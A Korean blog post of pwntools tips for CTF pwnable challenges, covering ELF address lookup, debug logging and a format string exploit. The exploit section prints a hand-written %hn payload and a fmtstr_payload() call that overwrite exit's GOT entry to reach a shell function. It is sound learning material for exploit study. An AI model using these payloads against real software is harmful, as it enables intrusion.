---
layout: post
title:  "Pwntools Usage"
date:   2020-10-01
categories: ["2020","tips","pwnable"]
update:   2020-10-01
comment: true
tags: [tips,pwnable]
---

## Pwntools Usage

❗ FSB 문제를 풀다가 새로 알게 된 pwntools의 기능이 있어 정리하고 이참에 pwntools 기능들 배우는 거 있을 때마다 여기에 업데이트 하려고 한다. 

---

### ELF

바이너리의 `got`, `bss` 등 여러 주소를 구할 때 `ELF()`를 쓰면 편하다.

```python
from pwn import *

e=ELF('binary') 
puts_got =e.got['puts'] # get puts got addr (same with plt)
bss_addr = e.bss() # get bss addr
func_addr = e.symbols['func'] # get custom func addr
```

 주로 위 3가지를 많이 쓴다. 주소들을 정수로 반환해줘서 바로 packing에 사용할 수 있다.

---

### DEBUG

pwntools에는 디버깅할 때 유용한 기능도 많이 제공한다.

``` python
from pwn import *

context.log_level="debug" # give useful info for debugging
log.info('some_string') # logging message (much better than print())
```

`context.log_level="debug"`는 python 파일을 실행하고 내가 `send`할 때나 `recv`할 때, 자세한 정보를 보여줘서 디버깅할 때 편하다.

`log.info()`는 그냥 `print()`로 확인하는 거보다 간지나는 로깅 메시지를 남길 수 있다.

가장 중요한 **gdb.attach() & raw_input()** :

> 🚀 참고
>
> https://cosyp.tistory.com/229

내가 저 사람보다 자세히 쓸 자신이 없다 ! 😁

---

### FSB (Format String Bug) with Pwntools

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

`Partial RELRO`가 걸려있기 때문에 `got` 주소를 덮어야 겠다고 생각하고 코드를 보면, **FSB**가 발생해서 `got`를 덮을 수 있다. 쉘을 따주는 함수도 있었기 때문에 그 함수 주소로 main함수 마지막에 실행하는 `exit`함수의 `got`를 덮어 쉘을 따려고 했다. 

나는 평소에 **FSB**를 사용할 때 `%hn`으로 2바이트씩 안 덮고 한꺼번에 `%n`로 4바이트를 덮었다. 근데 이 문제에서는 그렇게 하니까 안 된다. 이유는 정확히는 모르겠지만 시간제한 때문인 거 같다.. 그래서 `%hn`으로 2바이트씩 덮어줬고 성공했다.

즉 페이로드가 다음과 같다:

```python
payload+=p32(exit_got+2)
payload+=p32(exit_got)
payload+="%2044c"
payload+="%1$hn"
payload+="%32261c"
payload+="%2$hn"
```

**But** pwntools에는 이 페이로드를 알아서 짜주는 짱짱 기능이 있었다. 😂

``` python
# offset = 1, overwrite exit_got to get_shell
payload=fmtstr_payload(1,{exit_got:get_shell})
```

`fmtstr_payload()`라는 함수에 offset과 덮을 함수를 주면 알아서 페이로드를 짜준다.... 미쳐따 그냥

여기서 offset은 `ESP+0x4*(offset)`이라고 생각하면 된다. 즉 `%x`를 했을 때 첫번 째 `%x`에서 buf의 시작지점의 문자열이 출력되었기 때문에 offset이 1이다.

